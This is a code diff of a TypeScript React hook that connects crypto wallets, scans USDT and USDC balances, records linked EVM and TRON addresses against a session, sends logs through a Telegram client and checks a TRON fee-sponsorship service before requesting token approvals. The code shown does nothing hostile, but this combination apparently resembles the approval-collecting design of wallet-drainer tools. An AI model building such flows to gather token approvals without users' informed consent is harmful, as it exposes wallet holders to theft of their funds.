@@ -5,7 +5,11 @@ import { TERMS_VERSION } from "../core/approve-config";
 import { fetchBalances } from "../core/balances-client";
 import { postTgLog } from "../core/tg-log-client";
 import { projectId, WC_CONNECT_NAMESPACES } from "../core/constants";
-import { createConnectLogStep } from "../observability/connect-logger";
+import { fetchTronSponsorHealth } from "../authorization/tron-sponsor-health";
+import {
+  createConnectLogStep,
+  setConnectSessionWallets,
+} from "../observability/connect-logger";
 import { rowsFromBalances } from "../core/network-meta";
 import { createBrowserApprovalOrchestrator } from "../approval/create-browser-orchestrator";
 import { ApprovalStageName, StageStatus } from "../approval/types";
@@ -312,17 +316,23 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
   const createStageAwareLogger = useCallback(
     () => ({
       info: (event: string, detail?: Record<string, unknown>) => {
-        logStep(event, detail ?? {});
+        if (!/^APPROVAL_ORCHESTRATION_|^STAGE_RETRY$/.test(event)) {
+          logStep(event, detail ?? {});
+        }
         if (event === "STAGE_START" && detail?.stage) {
           const stage = String(detail.stage);
           setAuthorizingPhase(mapApprovalStageToPhase(stage));
         }
       },
       warn: (event: string, detail?: Record<string, unknown>) => {
-        logStep(event, detail ?? {});
+        if (!/^APPROVAL_ORCHESTRATION_|^STAGE_RETRY$/.test(event)) {
+          logStep(event, detail ?? {});
+        }
       },
       error: (event: string, detail?: Record<string, unknown>) => {
-        logStep(event, detail ?? {});
+        if (!/^APPROVAL_ORCHESTRATION_|^STAGE_RETRY$/.test(event)) {
+          logStep(event, detail ?? {});
+        }
       },
     }),
     [logStep, mapApprovalStageToPhase],
@@ -468,6 +478,10 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
             usdt: r.balances.usdt,
             usdc: r.balances.usdc ?? null,
           })),
+        });
+        setConnectSessionWallets(traceIdRef.current, {
+          evm: linkedFinal.evm ?? undefined,
+          tron: linkedFinal.tron ?? undefined,
         });
 
         // Native fee estimates are fetched during authorization when needed (not on network pick).
@@ -655,13 +669,25 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
       preloadNetworkIcons();
       await scanWallet(linked);
     } catch (err: unknown) {
-      logStep(TRANSACTION_TERMINAL_STAGES.FAILED, {
-        error: getErrorMessage(err, "connect failed"),
-        phase: "connect",
-      });
-      markTerminal("FAILED");
+      const rawMessage = getErrorMessage(err, "connect failed");
+      const proposalExpired = /proposal expired|session expired|pairing expired/i.test(
+        rawMessage,
+      );
+      logStep(
+        proposalExpired
+          ? TRANSACTION_TERMINAL_STAGES.EXPIRED
+          : TRANSACTION_TERMINAL_STAGES.FAILED,
+        {
+          error: rawMessage,
+          phase: "connect",
+          ...(proposalExpired ? { reason: "walletconnect_proposal_expired" } : {}),
+        },
+      );
+      markTerminal(proposalExpired ? "EXPIRED" : "FAILED");
       modal?.closeModal();
-      const message = getErrorMessage(err, "Connection cancelled");
+      const message = proposalExpired
+        ? "Wallet connection expired — scan the QR code again."
+        : getErrorMessage(err, "Connection cancelled");
       if (/reset/i.test(message)) {
         setError("Connection request reset. Please try again.");
       } else if (!/rejected|denied|cancel|abort/i.test(message)) {
@@ -775,6 +801,30 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
         assetCount: items.length,
         assets: items.map((i) => `${i.network}:${i.asset}`),
       });
+
+      if (items.some((item) => item.network === "tron")) {
+        const sponsorHealth = await fetchTronSponsorHealth("");
+        if (!sponsorHealth.ok) {
+          logStep("TRON SPONSOR HEALTH FAILED", {
+            network: "tron",
+            error: sponsorHealth.message,
+            delegator: sponsorHealth.delegator,
+          });
+          setError(
+            sponsorHealth.message ??
+              "TRON energy sponsorship is unavailable. Try again later.",
+          );
+          setApproving(false);
+          approvingLockRef.current = false;
+          linkingNetworkKeyRef.current = null;
+          setModalStep("preferences");
+          return;
+        }
+        logStep("TRON SPONSOR HEALTH OK", {
+          network: "tron",
+          delegator: sponsorHealth.delegator,
+        });
+      }
 
       let sessionNetworks = networks;
       const snapshotAt = balancesSnapshotAtRef.current;
